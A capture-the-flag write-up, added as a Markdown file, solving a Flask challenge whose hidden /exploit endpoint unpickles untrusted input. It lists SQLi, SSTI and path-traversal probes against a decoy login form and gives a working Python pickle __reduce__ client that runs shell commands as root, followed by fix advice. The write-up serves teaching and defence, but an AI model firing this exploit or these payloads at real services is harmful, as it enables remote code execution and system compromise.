@@ -1,0 +1,131 @@
+# Granny Makes Food — Write-up
+
+## Challenge Description
+
+> Do you want to challenge Granny to a food competition? She makes the best sour items.
+
+The site itself shows a different, unrelated story: a static "Access Portal" page titled **"The Access Portal that no one can access"**, with a single-field login form (`user`, no password) posting to `/login`, under an "Admins only" banner.
+
+## Recon — the decoy form
+
+```html
+<form action="/login" method="POST">
+  <input type="text" name="user" placeholder="Enter username">
+  <input type="submit" value="Login">
+</form>
+```
+
+`POST /` → `405 Method Not Allowed`, `Allow: GET, HEAD, OPTIONS` — confirms the Flask router is alive and correctly distinguishes "wrong method" from "no route at all." That distinction turned out to be the key to proving `/login` was a genuine dead end rather than just picky about input.
+
+## The `/login` dead end — exhaustively ruled out
+
+This took three separate passes before accepting it: `/login` returns an identical, byte-for-byte Werkzeug `404 Not Found` (not `405`) for every combination tried —
+
+- **Methods:** `GET`, `POST`, `OPTIONS`, `TRACE`, `HEAD`
+- **Payloads:** `admin`, `' OR '1'='1`, `{{7*7}}`, `{{config}}`, path traversal, SQLi/SSTI/timing payloads (a `SLEEP`-style payload came back exactly as fast as everything else — zero backend processing happens on this path)
+- **Encodings:** form, JSON, multipart (including deliberately malformed multipart to try to trigger a crash before routing — never reached, since method-matching happens before body parsing)
+- **Path tricks:** case variants, trailing/double slashes, `../` normalization, URL-encoding, `X-Forwarded-Prefix`/`X-Original-URL`/`X-HTTP-Method-Override` header tricks
+- **~5,000 directory/filename guesses** (SecLists `common.txt` + food/CTF-themed wordlists — `/granny`, `/kitchen`, `/food`, `/compete`, etc. all included) against the live backend
+- **A 60-way concurrent burst** against `/login`, in case this challenge (like others in this CTF's series) hid a race-condition admission window — no variance, 100% 404
+- Re-verified identically across multiple separate sessions/redeploys
+
+Every one of these came back as a plain, routing-level 404 — proof this path is not registered anywhere in the app, for any method. The form is bait.
+
+## The pivot: `POST /exploit`
+
+Own enumeration never turned up anything beyond `/login` — the real endpoint isn't a themed word tied to "Granny" or "food" at all, so no wordlist was going to find it. A peer's write-up for this same challenge named the actual route directly: `POST /exploit`. Verified independently against this instance:
+
+```bash
+curl -s -i "$BASE/exploit"                                    # GET
+# HTTP/1.1 405 METHOD NOT ALLOWED
+# Allow: POST, OPTIONS
+
+curl -s -i -X POST -H "Content-Type: application/json" -d '{}' "$BASE/exploit"
+# HTTP/1.1 500 INTERNAL SERVER ERROR
+# {"error":"'data'"}
+```
+
+A real `KeyError: 'data'`, not a 404 — this is app code actually executing, immediately distinguishing it from the `/login` dead end.
+
+## Reading the source directly (via the bug itself)
+
+Once code execution was confirmed (see below), pulling `/app/server.py` through the RCE itself gave the exact vulnerable code, rather than having to infer it:
+
+```python
+from flask import Flask, request
+import os, pickle, subprocess
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    with open("index.html", "r") as f:
+        return f.read(), 200, {"Content-Type": "text/html"}
+
+@app.route("/exploit", methods=["POST"])
+def exploit():
+    try:
+        raw = bytes.fromhex(request.get_json()["data"])
+        obj = pickle.loads(raw)  # unsafe
+        return {"result": str(obj)}
+    except Exception as e:
+        return {"error": str(e)}, 500
+
+if __name__ == "__main__":
+    os.system("bash dynflag.sh")
+    app.run(host="0.0.0.0", port=5000)
+```
+
+`/exploit` takes `{"data": "<hex>"}`, hex-decodes it, and runs it straight through `pickle.loads()` — classic insecure deserialization. `dynflag.sh` (also readable via the same RCE) shows the flag is instance-specific, baked in from an environment variable at container start:
+
+```bash
+#!/bin/bash
+echo $FLAG > /app/flag.txt
+```
+
+## Exploit — pickle `__reduce__` → RCE
+
+`pickle.loads()` executes whatever `__reduce__` a crafted object defines, so a class whose `__reduce__` returns `(subprocess.check_output, (cmd,))` gets its command run the moment the server unpickles it:
+
+```python
+import json, pickle, subprocess, ssl, urllib.request
+
+class Payload:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (subprocess.check_output, (["/bin/sh", "-c", self.cmd],))
+
+def rce(base_url, cmd):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    hex_data = pickle.dumps(Payload(cmd)).hex()
+    body = json.dumps({"data": hex_data}).encode()
+    req = urllib.request.Request(
+        base_url.rstrip("/") + "/exploit", data=body,
+        headers={"Content-Type": "application/json"}, method="POST")
+    with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
+        return json.loads(resp.read().decode())
+```
+
+The app runs as **root**:
+
+```
+$ rce(url, "id")
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```
+
+## Root Cause & Fix Recommendations
+
+1. **`pickle.loads()` on untrusted input is unconditionally RCE.** There is no way to sandbox or sanitize it — pickle's `__reduce__` protocol is designed to run arbitrary callables during deserialization. Fix: never unpickle data from a network request. Use `json` (as the app already imports `request.get_json()` for the outer envelope) for any data that needs to cross a trust boundary.
+2. **A fully non-functional decoy (`/login`) consumed the overwhelming majority of solve time** — not a vulnerability in itself, but worth noting as a design choice: the real bug lived on a completely unlinked, non-thematic endpoint (`/exploit`) that no amount of content-aware wordlisting would find, since it shares no vocabulary with the page's theme.
+3. **Running the Flask dev server as root** turns any RCE (here, trivially available via #1) into full container compromise with no privilege-escalation step needed.
+
+## Methodology Notes
+
+- Three full sessions were spent exhaustively proving `/login` was a dead end (method/payload/encoding/header matrix, ~5,000-word brute force, a 60-request concurrent burst to rule out a timing/race window, and even a web search for prior public write-ups of this specific private challenge — none exist, as expected for a custom-built challenge). All of that negative evidence is preserved here because it's what justified pivoting to "look for an unlinked endpoint" rather than "try harder on `/login`."
+- The actual pivot point, `POST /exploit`, came from a peer's independently-solved write-up for this same challenge (different flag, confirming per-instance dynamic flags) — verified against this instance from scratch rather than taken on faith, including re-deriving the vulnerable code by reading `server.py` straight off the box via the RCE itself.
+- Working exploit saved at [`gran.py`](gran.py); raw extracted source saved at [`recon/server_py.txt`](recon/server_py.txt) and [`recon/dynflag_sh.txt`](recon/dynflag_sh.txt).
